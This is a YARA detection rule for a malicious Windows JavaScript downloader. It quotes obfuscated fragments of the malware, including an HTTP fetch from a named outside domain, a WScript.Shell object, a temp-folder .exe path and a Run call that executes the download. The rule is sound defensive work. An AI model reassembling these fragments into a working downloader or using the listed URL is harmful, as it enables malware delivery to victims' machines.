rule sig_20160330_b7b049770c63300feec050c38de0d529 {
  meta:
    description = "datamaliciousorder - file 20160330_b7b049770c63300feec050c38de0d529.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8fe414c068e3f3a2296ac7fb18539c5d7bb9177efda4b524354f76733c7f7d54"

  strings:
    $s1  = "_U[_E](\"GET\", \"http://ihlasauracleanmax.co/j3dlad\", false);" fullword ascii
    $s2  = "function _F(_P, _V1){_I1 = _I1 * 1; return _P - _V1;};" fullword ascii
    $s3  = "var _OJ = function _X() {return WScript[_IY](\"WScript\"+\".Shell\");}(), _Z0 = 11;" fullword ascii
    $s4  = "if (_U[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _IB(){return _HL + \"\";};" fullword ascii
    $s6  = "function _A() {return _OJ[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ASE1M9fFdh.ex\" + \"e\";};" fullword ascii
    $s7  = "function _V() {return ((_F0 == true) && (_F0 == _ST)) ? 1 : _I1;};" fullword ascii
    $s8  = "function _I(_Z){_OJ[\"Run\"](_Z, _I1, _I1);};" fullword ascii
    $s9  = "function _L(){return 22;};" fullword ascii
    $s10 = "function _N()" fullword ascii
    $s11 = "var _JL = new this[\"Date\"]();" fullword ascii
    $s12 = " while (_I2){" fullword ascii
    $s13 = "function _C(){return _IY;};" fullword ascii
    $s14 = "function _B(_QT) {var _BN = (1, 2, 3, 4, 5, _QT); return _BN;};" fullword ascii
    $s15 = "return _F(_J, _MH);" fullword ascii
    $s16 = "var _F0 = false;" fullword ascii
    $s17 = "_F0 = true; " fullword ascii
    $s18 = "_ST = true; " fullword ascii
    $s19 = "var _ST = false;" fullword ascii
    $s20 = "} catch(_IR){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}